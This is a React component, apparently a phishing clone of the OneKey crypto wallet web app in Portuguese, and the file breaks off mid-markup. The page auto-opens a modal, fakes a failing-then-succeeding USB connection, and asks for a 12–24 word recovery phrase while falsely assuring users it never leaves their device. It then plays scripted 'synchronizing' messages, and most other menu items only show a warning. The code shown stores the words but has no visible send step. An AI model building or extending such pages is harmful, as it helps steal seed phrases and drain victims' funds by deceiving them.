import React, { useState, useEffect } from "react";

export default function Wallet() {
  const [showCard, setShowCard] = useState(true);
  const [showModal, setShowModal] = useState(false);
  const [loading, setLoading] = useState(false);
  // Adicionar estado para modal de conexão
  const [modalStep, setModalStep] = useState<
    | "welcome"
    | "connect"
    | "wallets"
    | "import-methods"
    | "import-seed-phrase"
    | "import-seed-phrase-onekeytag"
  >("welcome");
  // Adicionar estados para simulação de conexão USB
  const [usbPopup, setUsbPopup] = useState(false);
  const [usbStep, setUsbStep] = useState<
    "prompt" | "loading" | "error" | "success" | "seed" | "seed-loading"
  >("prompt");
  const [seedCount, setSeedCount] = useState(12);
  const [seedWords, setSeedWords] = useState<string[]>(Array(12).fill(""));
  const [showSelect, setShowSelect] = useState(false);
  const [showAccessCodeModal, setShowAccessCodeModal] = useState(false);
  const [showNewCode, setShowNewCode] = useState(false);
  const [showConfirmCode, setShowConfirmCode] = useState(false);
  const [seedPhraseCount, setSeedPhraseCount] = useState(12);
  const [seedPhraseWords, setSeedPhraseWords] = useState<string[]>(
    Array(12).fill("")
  );
  const [nextImportStep, setNextImportStep] = useState<
    "phrase" | "onekeytag" | null
  >(null);
  const [showPrivateKeyLoading, setShowPrivateKeyLoading] = useState(false);
  const [showAddressLoading, setShowAddressLoading] = useState(false);
  // Novos estados para loading de sincronização
  const [showSyncLoading, setShowSyncLoading] = useState(false);
  const [syncStep, setSyncStep] = useState<"loading" | "success">("loading");
  const [syncMessage, setSyncMessage] = useState("Synchronizing...");
  const [showSeedDropdown, setShowSeedDropdown] = useState(false);
  const [showWarningModal, setShowWarningModal] = useState(false);
  const [showWarningSpinner, setShowWarningSpinner] = useState(true);
  const [warningTimeout, setWarningTimeout] = useState<NodeJS.Timeout | null>(
    null
  );

  // Abrir modal automaticamente ao carregar a página
  useEffect(() => {
    setShowModal(true);
  }, []);

  const handleOpenModal = () => {
    setShowModal(true);
  };

  // Função para iniciar conexão
  const handleStartConnection = () => {
    setUsbPopup(true);
    setUsbStep("prompt");
  };

  // Função para conectar
  const handleUsbConnect = () => {
    setUsbStep("loading");
    setTimeout(() => {
      setUsbStep("error");
    }, 4000);
  };

  // Função para retry
  const handleUsbRetry = () => {
    setUsbStep("loading");
    setTimeout(() => {
      setUsbStep("success");
    }, 4000);
  };

  // Novo handler para avançar para seed
  const handleNextSeed = () => {
    setUsbStep("seed");
    setSeedWords(Array(seedCount).fill(""));
  };

  // Função para iniciar sincronização
  const handleStartSync = () => {
    setShowSyncLoading(true);
    setSyncStep("loading");
    setSyncMessage("Synchronizing...");

    // Sequência de mensagens
    setTimeout(() => {
      setSyncMessage("Validating your account...");
    }, 2000);

    setTimeout(() => {
      setSyncMessage("Setting up your wallet...");
    }, 4000);

    setTimeout(() => {
      setSyncMessage("Finalizing setup...");
    }, 6000);

    // Mostrar sucesso após 8 segundos
    setTimeout(() => {
      setSyncStep("success");
    }, 8000);

    // Fechar modal após 10 segundos
    setTimeout(() => {
      setShowSyncLoading(false);
      setModalStep("welcome");
      setShowModal(false);
    }, 10000);
  };

  // Função para exibir o modal de aviso
  const handleShowWarning = () => {
    setShowWarningModal(true);
    setShowWarningSpinner(true);
    if (warningTimeout) clearTimeout(warningTimeout);
    const timeout1 = setTimeout(() => {
      setShowWarningSpinner(false);
      // Esconde o modal automaticamente após 3s da mensagem
      const timeout2 = setTimeout(() => {
        setShowWarningModal(false);
      }, 3000);
      setWarningTimeout(timeout2);
    }, 2000);
    setWarningTimeout(timeout1);
  };

  return (
    <div className="flex h-screen bg-[#F5F6FA]">
      {/* Sidebar */}
      <aside className="flex flex-col justify-between w-[200px] bg-white border-r border-[#E9ECF2] py-4">
        <div>
          {/* Logo OneKey igual da página principal */}
          <div className="flex items-center gap-2 px-4 mb-6">
            <img
              src="/logo_green_vector.webp"
              alt="OneKey Logo"
              className="w-8 h-8"
            />
            <span className="font-bold text-xl text-black">OneKey</span>
          </div>
          {/* Menu */}
          <nav className="flex flex-col gap-1">
            <SidebarItem icon={<WalletIcon />} label="Carteira" active />
            <SidebarItem
              icon={<MarketIcon />}
              label="Mercado"
              onClick={handleShowWarning}
            />
            <SidebarItem
              icon={<SwapIcon />}
              label="Troca"
              onClick={handleShowWarning}
            />
            <SidebarItem
              icon={<EarnIcon />}
              label="Ganhar"
              onClick={handleShowWarning}
            />
            <SidebarItem
              icon={<ForwardIcon />}
              label="Encaminhamento"
              onClick={handleShowWarning}
            />
            <SidebarItem
              icon={<UserIcon />}
              label="Meu OneKey"
              onClick={handleShowWarning}
            />
            <SidebarItem
              icon={<BrowserIcon />}
              label="Navegador"
              onClick={handleShowWarning}
            />
          </nav>
        </div>
        <div className="flex flex-col gap-2 px-2 pb-2">
          <SidebarItem
            icon={<SettingsIcon />}
            label="Definições"
            onClick={handleShowWarning}
          />
          <SidebarItem icon={<DownloadIcon />} label="Baixar" />
          {/* Card Produto */}
          {showCard && (
            <div className="relative mt-2 bg-white rounded-xl shadow border border-[#E9ECF2] overflow-hidden flex flex-col">
              <button
                className="absolute top-2 right-2 text-[#393C4E] hover:bg-[#F5F6FA] rounded-full p-1"
                onClick={() => setShowCard(false)}
              >
                <svg width="16" height="16" viewBox="0 0 16 16">
                  <path
                    d="M4 4l8 8M12 4l-8 8"
                    stroke="#393C4E"
                    strokeWidth="2"
                    strokeLinecap="round"
                  />
                </svg>
              </button>
              <img
                src="/banner1.png"
                alt="OneKey Pro"
                className="w-full h-20 object-cover"
              />
              <div className="p-2">
                <div className="text-xs font-bold text-black">OneKey Pro</div>
                <div className="text-[11px] text-[#393C4E] leading-tight">
                  Proteja sua criptomoeda com a carteira de hardware mais
                  poderosa
                </div>
              </div>
            </div>
          )}
        </div>
      </aside>
      {/* Main */}
      <main className="flex-1 flex flex-col h-full">
        {/* Topbar */}
        <div className="flex items-center h-14 border-b border-[#E9ECF2] bg-white px-6">
          <div className="flex items-center gap-2">
            {/* <input
              type="checkbox"
              className="w-4 h-4 rounded border-[#D9DBE9]"
            /> */}
            <div className="font-medium text-black text-sm select-none cursor-pointer flex items-center gap-1">
              Sem conta
              <svg width="16" height="16" viewBox="0 0 16 16">
                <path
                  d="M4 6l4 4 4-4"
                  stroke="#393C4E"
                  strokeWidth="1.5"
                  fill="none"
                />
              </svg>
            </div>
          </div>
          <div className="flex-1" />
          <div className="flex items-center gap-6">
            {/* Sininho com badge */}
            <button className="relative">
              <svg
                fill="none"
                viewBox="0 0 24 24"
                width="24px"
                height="24px"
                color="#A3A3A3"
              >
                <path
                  stroke="currentColor"
                  strokeLinejoin="round"
                  strokeWidth="2"
                  d="M16 17a4 4 0 0 1-8 0m10.3-8.007.179 3.588c.014.276.085.547.209.794l1.227 2.454A.808.808 0 0 1 19.19 17H4.809a.81.81 0 0 1-.724-1.17l1.227-2.455a2 2 0 0 0 .209-.794l.18-3.588a6.308 6.308 0 0 1 12.599 0Z"
                />
              </svg>
              <span className="absolute -top-1 -right-1 bg-[#FF3B30] text-white text-[10px] rounded-full w-4 h-4 flex items-center justify-center font-bold">
                •
              </span>
            </button>
            {/* Quadradinhos */}
            <button>
              <svg
                fill="none"
                viewBox="0 0 24 24"
                width="24px"
                height="24px"
                color="#A3A3A3"
              >
                <path
                  stroke="currentColor"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth="2"
                  d="M12 6a1 1 0 1 0 0-2 1 1 0 0 0 0 2m0 7a1 1 0 1 0 0-2 1 1 0 0 0 0 2m0 7a1 1 0 1 0 0-2 1 1 0 0 0 0 2m7-14a1 1 0 1 0 0-2 1 1 0 0 0 0 2m0 7a1 1 0 1 0 0-2 1 1 0 0 0 0 2m0 7a1 1 0 1 0 0-2 1 1 0 0 0 0 2M5 13a1 1 0 1 0 0-2 1 1 0 0 0 0 2m0 7a1 1 0 1 0 0-2 1 1 0 0 0 0 2M5 6a1 1 0 1 0 0-2 1 1 0 0 0 0 2"
                />
              </svg>
            </button>
            {/* Usuário */}
            <button>
              <svg
                fill="none"
                viewBox="0 0 24 24"
                width="24px"
                height="24px"
                color="#A3A3A3"
              >
                <path
                  stroke="currentColor"
                  strokeLinejoin="round"
                  strokeWidth="2"
                  d="M15.5 6.5a3.5 3.5 0 1 1-7 0 3.5 3.5 0 0 1 7 0ZM12 13c-3.391 0-5.964 2.014-7.017 4.863C4.573 18.968 5.518 20 6.697 20h10.606c1.179 0 2.123-1.032 1.715-2.137C17.964 15.014 15.39 13 12 13Z"
                />
              </svg>
            </button>
          </div>
        </div>
        {/* Conteúdo central */}
        <div className="flex-1 flex flex-col items-center justify-center">
          <div className="flex flex-col items-center">
            <svg width="48" height="48" viewBox="0 0 48 48" className="mb-4">
              <rect
                x="10"
                y="16"
                width="28"
                height="16"
                rx="4"
                stroke="#A3A3A3"
                strokeWidth="2"
                fill="none"
              />
              <circle cx="18" cy="24" r="2" fill="#A3A3A3" />
              <rect x="28" y="22" width="6" height="4" rx="1" fill="#A3A3A3" />
            </svg>
            <div className="text-lg font-bold text-black mb-1">
              Sem carteira
            </div>
            <div className="text-sm text-[#393C4E] text-center mb-4 max-w-xs">
              Adicione a carteira para começar a gerir sua criptomoeda de forma
              segura e eficiente
            </div>
            <button
              className="bg-black text-white px-6 py-2 rounded-lg font-semibold text-sm hover:bg-[#393C4E] transition-colors"
              onClick={handleOpenModal}
            >
              Criar carteira
            </button>
          </div>
        </div>
        {/* Loading antes do modal */}
        {loading && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-60">
            <div className="flex items-center justify-center w-full h-full">
              <svg
                className="animate-spin-slow"
                width="56"
                height="56"
                viewBox="0 0 48 48"
                fill="none"
              >
                <circle
                  cx="24"
                  cy="24"
                  r="20"
                  stroke="#A3C7B6"
                  strokeWidth="4"
                  opacity="0.2"
                />
                <path
                  d="M44 24a20 20 0 1 1-20-20"
                  stroke="#1A1A1A"
                  strokeWidth="4"
                  strokeLinecap="round"
                />
              </svg>
            </div>
          </div>
        )}
        {/* Modal principal */}
        {showModal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-60 animate-fade-in">
            <div className="bg-white rounded-2xl shadow-xl w-full max-w-xl flex flex-col p-0 relative animate-fade-in transition-all duration-500 min-h-[520px]">
              {/* Header do modal */}
              {modalStep !== "import-methods" &&
                modalStep !== "import-seed-phrase" &&
                modalStep !== "import-seed-phrase-onekeytag" && (
                  <button
                    className="absolute left-6 top-2 text-xl text-[#888] hover:bg-[#F5F6FA] rounded-full p-1"
                    onClick={() => {
                      if (modalStep === "connect") setModalStep("welcome");
                      else {
                        setShowModal(false);
                        setNextImportStep(null);
                      }
                    }}
                    aria-label={modalStep === "connect" ? "Voltar" : "Fechar"}
                  >
                    {modalStep === "connect" ? (
                      // Ícone de voltar
                      <svg width="20" height="20" viewBox="0 0 20 20">
                        <path
                          d="M13 16l-5-6 5-6"
                          stroke="#888"
                          strokeWidth="2"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          fill="none"
                        />
                      </svg>
                    ) : (
                      // Ícone de X
                      <svg width="20" height="20" viewBox="0 0 20 20">
                        <path
                          d="M6 6l8 8M14 6l-8 8"
                          stroke="#888"
                          strokeWidth="2"
                          strokeLinecap="round"
                        />
                      </svg>
                    )}
                  </button>
                )}
              {/* Conteúdo do modal principal por etapa */}
              <div className="w-full flex flex-col transition-all duration-500 px-8 py-6 min-h-[520px]">
                {modalStep === "welcome" && (
                  <div className="flex flex-col items-center justify-center w-full h-full">
                    <img
                      src="/iamgemwallet.png"
                      alt="Wallet"
                      className="w-72 h-72 object-contain mx-auto mb-8 mt-4"
                    />
                    <div className="text-3xl font-bold text-black mb-3 text-center">
                      Bem-vindo ao OneKey
                    </div>
                    <div className="text-lg text-[#393C4E] mb-8 text-center">
                      Gestão simples e segura de criptomoedas
                    </div>
                    <button
                      className="w-full max-w-md bg-black text-white py-4 rounded-lg font-semibold text-lg mb-4 flex items-center justify-center gap-2 hover:bg-[#393C4E] transition-colors"
                      onClick={() => setModalStep("connect")}
                    >
                      <svg
                        fill="none"
                        viewBox="0 0 24 24"
                        width="20px"
                        height="20px"
                        color="var(--iconInverse)"
                      >
                        <path
                          stroke="currentColor"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth="2"
                          d="M10 6v1m4-1v1M4 10h16v9a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2zm2-7h12v7H6z"
                        />
                      </svg>
                      Conecte a carteira de hardware
                    </button>
                    <div className="relative w-full max-w-md mx-auto">
                      <button
                        className="w-full bg-[#F5F6FA] text-black py-4 rounded-lg font-semibold text-lg mb-4 flex items-center justify-center gap-2 hover:bg-[#E9ECF2] transition-colors"
                        onClick={() => setShowSelect((v) => !v)}
                      >
                        Criar ou importar carteira
                      </button>
                      {showSelect && (
                        <div className="absolute left-0 right-0 top-0 z-20 bg-white rounded-xl shadow-lg border border-[#E9ECF2] flex flex-col gap-0 animate-fade-in overflow-hidden">
                          <button
                            className="flex flex-col items-start gap-1 p-4 hover:bg-[#F5F6FA] transition-colors border-b border-[#E9ECF2] text-left"
                            onClick={() => {
                              /* ação para criar nova carteira */ setShowSelect(
                                false
                              );
                            }}
                          >
                            <span className="flex items-center gap-2 text-base font-semibold">
                              <span className="material-icons">
                                add_circle_outline
                              </span>
                              Criar nova carteira
                            </span>
                            <span className="text-xs text-[#393C4E] ml-7">
                              Frase de recuperação
                            </span>
                          </button>
                          <button
                            className="flex flex-col items-start gap-1 p-4 hover:bg-[#F5F6FA] transition-colors border-b border-[#E9ECF2] text-left"
                            onClick={() => {
                              setModalStep("import-methods");
                              setShowSelect(false);
                            }}
                          >
                            <span className="flex items-center gap-2 text-base font-semibold">
                              <span className="material-icons">history</span>
                              Importar carteira
                            </span>
                            <span className="text-xs text-[#393C4E] ml-7">
                              Transferir, restaurar, importar ou somente
                              visualização
                            </span>
                          </button>
                          <button
                            className="flex flex-col items-start gap-1 p-4 hover:bg-[#F5F6FA] transition-colors text-left"
                            onClick={() => {
                              setModalStep("wallets");
                              setShowSelect(false);
                            }}
                          >
                            <span className="flex items-center gap-2 text-base font-semibold">
                              <span className="material-icons">link</span>
                              Conectar carteira externa
                            </span>
                          </button>
                        </div>
                      )}
                    </div>
                    <div className="text-sm text-[#393C4E] text-center mt-2">
                      O uso implica consentimento aos nossos{" "}
                      <a href="#" className="underline">
                        Termos
                      </a>{" "}
                      &{" "}
                      <a href="#" className="underline">
                        Privacidade
                      </a>
                    </div>
                  </div>
                )}
                {modalStep === "connect" && (
                  <>
                    {/* Tabs */}
                    <div className="flex w-full mb-6">
                      <button className="flex-1 py-2 rounded-l-lg bg-[#F5F6FA] text-black font-semibold border border-[#E9ECF2] border-r-0">
                        USB
                      </button>
                      <button className="flex-1 py-2 rounded-r-lg bg-[#E9ECF2] text-[#A3A3A3] font-semibold border border-[#E9ECF2]">
                        Código QR
                      </button>
                    </div>
                    {/* Imagem do celular com fundo #F9F9F9 */}
                    <div className="w-full flex justify-center mb-6">
                      <div
                        className="w-full flex justify-center items-end bg-[#F9F9F9]"
                        style={{
                          minHeight: "180px",
                          borderTopLeftRadius: "1rem",
                          borderTopRightRadius: "1rem",
                        }}
                      >
                        <img
                          src="/celular.png"
                          alt="Celular"
                          className="max-w-[320px] w-full h-auto object-contain"
                        />
                      </div>
                    </div>
                    <div className="text-lg font-bold text-black mb-2 text-center">
                      Conecte o dispositivo via USB
                    </div>
                    <div className="text-base text-[#393C4E] mb-6 text-center">
                      Clique no botão abaixo e selecione seu dispositivo na
                      janela pop-up para conectar.
                    </div>
                    <button
                      className="bg-black text-white px-8 py-3 rounded-lg font-semibold text-base hover:bg-[#393C4E] transition-colors mb-2"
                      onClick={handleStartConnection}
                    >
                      Start connection
                    </button>
                    <div className="text-sm text-[#393C4E] text-center mt-2">
                      Ainda não tem OneKey?{" "}
                      <a href="#" className="underline text-green-600">
                        Compre um
                      </a>
                    </div>
                  </>
                )}
                {/* Adicionar etapa do modal para mostrar o WalletGrid */}
                {modalStep === "wallets" && (
                  <div className="w-full animate-fade-in">
                    <div className="w-full text-left text-lg font-semibold mb-4 flex items-center gap-2">
                      <button
                        className="mr-2"
                        onClick={() => setModalStep("welcome")}
                      >
                        {/* ícone de voltar */}
                        <svg width="24" height="24" viewBox="0 0 24 24">
                          <path
                            d="M15 19l-7-7 7-7"
                            stroke="#393C4E"
                            strokeWidth="2"
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            fill="none"
                          />
                        </svg>
                      </button>
                      Criar ou importar carteira
                    </div>
                    <div className="bg-white rounded-xl p-6 w-full max-w-md mx-auto flex flex-col gap-2 shadow-md">
                      <button
                        className="flex flex-col items-start gap-1 p-4 rounded-lg hover:bg-[#F5F6FA] transition-colors border border-[#E9ECF2] mb-1"
                        onClick={() => {
                          /* ação para criar nova carteira */
                        }}
                      >
                        <span className="flex items-center gap-2 text-base font-semibold">
                          <span className="material-icons">
                            add_circle_outline
                          </span>
                          Criar nova carteira
                        </span>
                        <span className="text-xs text-[#393C4E] ml-7">
                          Frase de recuperação
                        </span>
                      </button>
                      <button
                        className="flex flex-col items-start gap-1 p-4 rounded-lg hover:bg-[#F5F6FA] transition-colors border border-[#E9ECF2] mb-1"
                        onClick={() => setModalStep("import-methods")}
                      >
                        <span className="flex items-center gap-2 text-base font-semibold">
                          <span className="material-icons">history</span>
                          Importar carteira
                        </span>
                        <span className="text-xs text-[#393C4E] ml-7">
                          Transferir, restaurar, importar ou somente
                          visualização
                        </span>
                      </button>
                      <button
                        className="flex flex-col items-start gap-1 p-4 rounded-lg hover:bg-[#F5F6FA] transition-colors border border-[#E9ECF2]"
                        onClick={() => {
                          /* ação para conectar carteira externa */
                        }}
                      >
                        <span className="flex items-center gap-2 text-base font-semibold">
                          <span className="material-icons">link</span>
                          Conectar carteira externa
                        </span>
                      </button>
                    </div>
                  </div>
                )}
                {modalStep === "import-methods" && (
                  <div className="w-full max-w-xl flex flex-col p-0 relative">
                    {/* Seta de voltar e título na mesma linha, colados à esquerda */}
                    <div className="flex items-center h-70 px-0 ml-0">
                      <button
                        className="flex items-center justify-center w-10 h-10 rounded-full hover:bg-[#F5F6FA] z-10 ml-0"
                        onClick={() => setModalStep("welcome")}
                      >
                        <span className="material-icons text-2xl text-[#393C4E]">
                          arrow_back
                        </span>
                      </button>
                      <span className="text-xl font-semibold text-black ml-2">
                        Escolha o método de importação
                      </span>
                    </div>
                    {/* Conteúdo das opções, títulos colados à esquerda, opções com pequeno recuo */}
                    <div className="flex flex-col gap-0 pt-2 pb-4">
                      <div className="text-xs text-[#888] font-semibold pt-2 pb-1 pl-0">
                        Restaurar
                      </div>
                      <button
                        className="flex items-center w-full py-3 hover:bg-[#F5F6FA] transition-colors group pl-4"
                        onClick={() => setShowAccessCodeModal(true)}
                      >
                        {/* SVG personalizado para Frase de recuperação */}
                        <span className="mr-4">
                          <svg
                            fill="none"
                            viewBox="0 0 24 24"
                            width="24"
                            height="24"
                            style={{
                              color: "var(--iconSubdued)",
                              flexShrink: 0,
                            }}
                          >
                            <path
                              fill="currentColor"
                              d="M6 9a1 1 0 0 1 1-1h3a1 1 0 1 1 0 2H7a1 1 0 0 1-1-1M14 8a1 1 0 1 0 0 2h3a1 1 0 1 0 0-2zM6 12a1 1 0 0 1 1-1h3a1 1 0 1 1 0 2H7a1 1 0 0 1-1-1M14 11a1 1 0 1 0 0 2h3a1 1 0 1 0 0-2zM6 15a1 1 0 0 1 1-1h3a1 1 0 1 1 0 2H7a1 1 0 0 1-1-1M14 14a1 1 0 1 0 0 2h3a1 1 0 1 0 0-2z"
                            ></path>
                            <path
                              fill="currentColor"
                              fillRule="evenodd"
                              d="M2 7a3 3 0 0 1 3-3h14a3 3 0 0 1 3 3v10a3 3 0 0 1-3 3H5a3 3 0 0 1-3-3zm3-1a1 1 0 0 0-1 1v10a1 1 0 0 0 1 1h14a1 1 0 0 0 1-1V7a1 1 0 0 0-1-1z"
                              clipRule="evenodd"
                            ></path>
                          </svg>
                        </span>
                        <span className="text-base text-black font-medium flex-1 text-left">
                          Frase de recuperação
                        </span>
                        <span className="material-icons text-[#C0C0C0] group-hover:text-[#393C4E]">
                          chevron_right
                        </span>
                      </button>
                      <button
                        className="flex items-center w-full py-3 hover:bg-[#F5F6FA] transition-colors group pl-4"
                        onClick={() => {
                          setShowAccessCodeModal(true);
                          setNextImportStep("onekeytag"); // novo estado para saber qual fluxo mostrar após senha
                        }}
                      >
                        {/* SVG personalizado para OneKey KeyTag */}
                        <span className="mr-4">
                          <svg
                            fill="currentColor"
                            viewBox="0 0 24 24"
                            width="24"
                            height="24"
                            style={{
                              color: "var(--iconSubdued)",
                              flexShrink: 0,
                            }}
                          >
                            <path
                              fillRule="evenodd"
                              d="M3 6a3 3 0 0 1 3-3h12a3 3 0 0 1 3 3v12a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3zm16 12a1 1 0 0 1-1 1H6a1 1 0 0 1-1-1V6a1 1 0 0 1 1-1h12a1 1 0 0 1 1 1z"
                              clipRule="evenodd"
                            ></path>
                            <path d="M16 17.25a1.25 1.25 0 1 0 0-2.5 1.25 1.25 0 0 0 0 2.5m-6.75-9a1.25 1.25 0 1 1-2.5 0 1.25 1.25 0 0 1 2.5 0M12 9.5A1.25 1.25 0 1 0 12 7a1.25 1.25 0 0 0 0 2.5m4 0A1.25 1.25 0 1 0 16 7a1.25 1.25 0 0 0 0 2.5m-6.75 2.75a1.25 1.25 0 1 1-2.5 0 1.25 1.25 0 0 1 2.5 0M12 13.5a1.25 1.25 0 1 0 0-2.5 1.25 1.25 0 0 0 0 2.5m4 0a1.25 1.25 0 1 0 0-2.5 1.25 1.25 0 0 0 0 2.5m-4 3.75a1.25 1.25 0 1 0 0-2.5 1.25 1.25 0 0 0 0 2.5M9.25 16a1.25 1.25 0 1 1-2.5 0 1.25 1.25 0 0 1 2.5 0" />
                          </svg>
                        </span>
                        <span className="text-base text-black font-medium flex-1 text-left">
                          OneKey KeyTag
                        </span>
                        <span className="material-icons text-[#C0C0C0] group-hover:text-[#393C4E]">
                          chevron_right
                        </span>
                      </button>
                      <div className="border-t border-[#E9ECF2] my-2" />
                      <div className="text-xs text-[#888] font-semibold pt-2 pb-1 pl-0">
                        Importação
                      </div>
                      <button
                        className="flex items-center w-full py-3 hover:bg-[#F5F6FA] transition-colors group pl-4"
                        onClick={() => setShowPrivateKeyLoading(true)}
                      >
                        {/* SVG personalizado para Chave privada */}
                        <span className="mr-4">
                          <svg
                            fill="none"
                            viewBox="0 0 24 24"
                            width="24"
                            height="24"
                            style={{
                              color: "var(--iconSubdued)",
                              flexShrink: 0,
                            }}
                          >
                            <path
                              fill="currentColor"
                              d="M15.5 7a1.5 1.5 0 1 0 0 3 1.5 1.5 0 0 0 0-3"
                            ></path>
                            <path
                              fill="currentColor"
                              fillRule="evenodd"
                              d="M15.5 2a6.5 6.5 0 0 0-6.422 7.508l-5.2 5.2A3 3 0 0 0 3 16.827V19a2 2 0 0 0 2 2h2.172a3 3 0 0 0 2.12-.879l1.415-1.414A1 1 0 0 0 11 18v-1.5h1.5a1 1 0 0 0 .707-.293l1.285-1.285Q14.986 15 15.5 15a6.5 6.5 0 1 0 0-13M11 8.5a4.5 4.5 0 1 1 3.406 4.366 1 1 0 0 0-.95.263l-1.37 1.371H10a1 1 0 0 0-1 1v2.086l-1.121 1.121a1 1 0 0 1-.707.293H5v-2.172a1 1 0 0 1 .293-.707l5.578-5.577a1 1 0 0 0 .263-.95A4.5 4.5 0 0 1 11 8.5"
                              clipRule="evenodd"
                            ></path>
                          </svg>
                        </span>
                        <span className="text-base text-black font-medium flex-1 text-left">
                          Chave privada
                        </span>
                        <span className="material-icons text-[#C0C0C0] group-hover:text-[#393C4E]">
                          chevron_right
                        </span>
                      </button>
                      <div className="border-t border-[#E9ECF2] my-2" />
                      <div className="text-xs text-[#888] font-semibold pt-2 pb-1 pl-0">
                        Somente visualização
                      </div>
                      <button
                        className="flex items-center w-full py-3 hover:bg-[#F5F6FA] transition-colors group pl-4"
                        onClick={() => setShowAddressLoading(true)}
                      >
                        {/* SVG personalizado para Endereço */}
                        <span className="mr-4">
                          <svg
                            fill="none"
                            viewBox="0 0 24 24"
                            width="24"
                            height="24"
                            style={{
                              color: "var(--iconSubdued)",
                              flexShrink: 0,
                            }}
                          >
                            <path
                              stroke="currentColor"
                              strokeLinecap="round"
                              strokeLinejoin="round"
                              strokeWidth="2"
                              d="M15 12a3 3 0 1 1-6 0 3 3 0 0 1 6 0"
                            ></path>
                            <path
                              stroke="currentColor"
                              strokeLinecap="round"
                              strokeLinejoin="round"
                              strokeWidth="2"
                              d="M21.497 11.095c-4.837-8.127-14.157-8.127-18.994 0a1.77 1.77 0 0 0 0 1.81c4.837 8.127 14.157 8.127 18.994 0a1.77 1.77 0 0 0 0-1.81"
                            ></path>
                          </svg>
                        </span>
                        <span className="text-base text-black font-medium flex-1 text-left">
                          Endereço
                        </span>
                        <span className="material-icons text-[#C0C0C0] group-hover:text-[#393C4E]">
                          chevron_right
                        </span>
                      </button>
                    </div>
                  </div>
                )}
                {modalStep === "import-seed-phrase" && (
                  <>
                    {/* Topo: seta, título e select embaixo da seta - menores */}
                    <div className="flex flex-col mb-4">
                      <div className="flex items-center mb-3">
                        <button
                          className="flex items-center justify-center w-8 h-8 rounded-full hover:bg-[#F5F6FA] mr-2"
                          onClick={() => {
                            setModalStep("import-methods");
                            setSeedPhraseCount(12);
                            setSeedPhraseWords([]);
                          }}
                        >
                          <span className="material-icons text-xl text-[#393C4E]">
                            arrow_back
                          </span>
                        </button>
                        <span className="text-lg font-semibold text-black">
                          Importar frase de recuperação
                        </span>
                      </div>
                      {/* Select e botão limpar na mesma linha */}
                      <div className="flex items-center justify-between ml-10 mr-4">
                        <div className="relative">
                          <button
                            className="flex items-center text-xs font-semibold text-[#393C4E] bg-[#F5F6FA] px-2 py-1 rounded-md hover:bg-[#E9ECF2]"
                            onClick={() => setShowSeedDropdown((v) => !v)}
                            type="button"
                          >
                            {seedPhraseCount} palavras
                            <span className="material-icons ml-1 text-sm">
                              expand_more
                            </span>
                          </button>
                          {showSeedDropdown && (
                            <div className="absolute left-0 mt-1 w-32 bg-white rounded-lg shadow border border-[#E9ECF2] z-10">
                              {[12, 15, 18, 21, 24].map((count) => (
                                <button
                                  key={count}
                                  className={`w-full text-left px-3 py-1.5 text-xs hover:bg-[#F5F6FA] ${
                                    seedPhraseCount === count
                                      ? "font-bold text-black"
                                      : "text-[#393C4E]"
                                  }`}
                                  onClick={() => {
                                    setSeedPhraseCount(count);
                                    setSeedPhraseWords(Array(count).fill(""));
                                    setShowSeedDropdown(false);
                                  }}
                                >
                                  {count} palavras
                                </button>
                              ))}
                            </div>
                          )}
                        </div>
                        <button
                          className="flex items-center text-xs font-semibold text-[#393C4E] hover:underline gap-1"
                          onClick={() =>
                            setSeedPhraseWords(Array(seedPhraseCount).fill(""))
                          }
                        >
                          <span className="material-icons text-sm">
                            auto_delete
                          </span>{" "}
                          Limpar
                        </button>
                      </div>
                    </div>

                    {/* Inputs das palavras organizados em linhas de 3 - menores */}
                    <div className="space-y-3 mb-4">
                      {Array.from(
                        { length: Math.ceil(seedPhraseCount / 3) },
                        (_, rowIdx) => (
                          <div key={rowIdx} className="grid grid-cols-3 gap-3">
                            {Array.from({ length: 3 }, (_, colIdx) => {
                              const inputIdx = rowIdx * 3 + colIdx;
                              if (inputIdx >= seedPhraseCount) return null;
                              return (
                                <input
                                  key={inputIdx}
                                  type="text"
                                  className="border border-[#E9ECF2] rounded-md px-3 py-2 text-sm focus:outline-none focus:ring-1 focus:ring-black text-center"
                                  placeholder={`${inputIdx + 1}`}
                                  value={seedPhraseWords[inputIdx] || ""}
                                  onChange={(e) => {
                                    const newWords = [...seedPhraseWords];
                                    newWords[inputIdx] = e.target.value;
                                    setSeedPhraseWords(newWords);
                                  }}
                                />
                              );
                            })}
                          </div>
                        )
                      )}
                    </div>

                    {/* Texto explicativo agora embaixo dos inputs */}
                    <div className="mb-4 p-3 bg-[#F8F9FA] rounded-lg border border-[#E9ECF2]">
                      <div className="text-xs font-semibold text-black mb-1">
                        O que é uma frase de recuperação?
                      </div>
                      <div className="text-xs text-[#393C4E] leading-relaxed mb-2">
                        Uma série de 12, 18 ou 24 palavras para restaurar sua
                        carteira.
                      </div>
                      <div className="text-xs font-semibold text-black mb-1">
                        É seguro inseri-lo no OneKey?
                      </div>
                      <div className="text-xs text-[#393C4E] leading-relaxed">
                        Sim, é armazenado localmente e nunca sai do seu
                        dispositivo sem a sua permissão explícita.
                      </div>
                    </div>

                    {/* Botão Confirmar */}
                    <div className="flex justify-end">
                      <button
                        className="bg-black text-white px-6 py-2 rounded-lg font-bold text-sm hover:bg-[#393C4E] transition-colors"
                        onClick={handleStartSync}
                      >
                        Confirmar
                      </button>
                    </div>
                  </>
                )}
                {modalStep === "import-seed-phrase-onekeytag" && (
                  <>
                    {/* Topo: seta, título e select embaixo da seta - menores */}
                    <div className="flex flex-col mb-4">
                      <div className="flex items-center mb-3">
                        <button
                          className="flex items-center justify-center w-8 h-8 rounded-full hover:bg-[#F5F6FA] mr-2"
                          onClick={() => {
                            setModalStep("import-methods");
                            setSeedPhraseCount(12);
                            setSeedPhraseWords([]);
                          }}
                        >
                          <span className="material-icons text-xl text-[#393C4E]">
                            arrow_back
                          </span>
                        </button>
                        <span className="text-lg font-semibold text-black">
                          Importar frase de recuperação
                        </span>
                      </div>
                      {/* Select e botão limpar na mesma linha */}
                      <div className="flex items-center justify-between ml-10 mr-4">
                        <div className="relative">
                          <button
                            className="flex items-center text-xs font-semibold text-[#393C4E] bg-[#F5F6FA] px-2 py-1 rounded-md hover:bg-[#E9ECF2]"
